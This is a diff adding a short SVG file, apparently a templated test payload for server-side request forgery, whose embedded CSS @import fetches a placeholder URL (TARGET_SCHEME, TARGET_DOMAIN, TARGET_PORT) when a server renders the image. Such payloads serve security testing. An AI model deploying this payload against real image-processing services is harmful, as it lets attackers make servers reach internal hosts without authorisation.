@@ -1,0 +1,16 @@
+<?xml version="1.0" standalone="no"?>
+<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+<defs>
+<style type="text/css">
+    <![CDATA[
+        @import url("TARGET_SCHEME://ssrf-svg-style-cdata-import-url.TARGET_DOMAIN:TARGET_PORT/");
+        rect {
+            fill: red;
+            stroke: blue;
+            stroke-width: 3
+            }
+    ]]>
+</style>
+</defs>
+<rect x="200" y="100" width="600" height="300"/>
+</svg>
